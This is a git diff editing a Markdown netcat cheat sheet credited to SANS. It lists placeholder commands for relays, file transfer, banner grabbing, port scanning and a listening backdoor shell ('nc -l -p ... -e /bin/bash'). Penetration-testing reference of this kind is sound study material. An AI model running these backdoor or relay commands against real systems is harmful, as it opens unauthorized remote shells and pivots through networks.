@@ -6,9 +6,8 @@ The [SANS Institute](http://www.sans.org/security-resources/sec560/netcat_cheat_
 
 ## Relays on Linux
 Before you do any of the Linux relays with netcat below, please do the following:
-``$ cd /tmp
-$ mknod backpipe p
-``
+``$ cd /tmp``
+``$ mknod backpipe p``
 
 ## Commands
 | Command  | Category | Description / Importance |
@@ -19,8 +18,8 @@ $ mknod backpipe p
 | `$ nc -l -p [LocalPort_1] 0<backpipe` &#124; `nc -l -p [LocalPort_2]` &#124; `tee backpipe` | Relay - Linux | **Listener-to-Listener Relay** - Create a relay that will send packets from any connection on {LocalPort_1] to any connection on [LocalPort_2] |
 | `C:\> echo nc [NextHopIPaddr] [port2] > relay.bat`<br>`C:\> nc [PreviousHopIPaddr] [port] -e relay.bat` | Relay - Windows | **Client-to-Client Relay** - Create a relay that will send packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2] |
 | `$ nc [PreviousHopIPaddr] [port] 0<backpipe` &#124; `nc [NextHopIPaddr] [port2]` &#124; `tee backpipe` | Relay - Linux | **Client-to-Client Relay** - Create a relay that will send packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2] |
-| **Client:** `nc -l -p [LocalPort] > [outfile]`<br>**Listener:** `nc -w3 [TargetIPaddr] [port] < [infile]` | File Transfer - All OS | Push [infile] to [TargetIPaddr] on [port] |
-| **Listener:** `nc -l -p [LocalPort] < [infile]`<br>**Client:** `nc -w3 [TargetIPaddr] [port] > [outfile]` | File Transfer - All OS | Connect to [TargetIPaddr] on [port] and retrieve [outfile] |
+| **Server:** `nc -w3 [TargetIPaddr] [port] < [infile]`<br>**Client:** `nc -l -p [LocalPort] > [outfile]` | File Transfer - All OS | Push [infile] to [TargetIPaddr] on [port] |
+| **Server:** `nc -l -p [LocalPort] < [infile]`<br>**Client:** `nc -w3 [TargetIPaddr] [port] > [outfile]` | File Transfer - All OS | Connect to [TargetIPaddr] on [port] and retrieve [outfile] |
 | `echo ""` &#124; `nc -v -n -w1 [TargetIPaddr] [start_port] [end_port]` | TCP Banner Grabber | Attempt to connect to each port in a range from [end_port] to [start_port] on [TargetIPaddr]. Then send a blank string to the open port and print out any banner received in response. | 
 | `nc -v -n -z -w1 [TargetIPaddr] [start_port] [end_port]` | TCP Port Scanner | Attempt to connect to each port in a range from [end_port] tp [start_port] on IP address [TargetIPaddr]. |
 | `$ nc -l -p [LocalPort] -e /bin/bash` | Backdoor - Linux | Listening backdoor shell for a Linux computer. Use a netcat client to connect to the target's IP address on the [LocalPort] and you will get a BASH shell. |
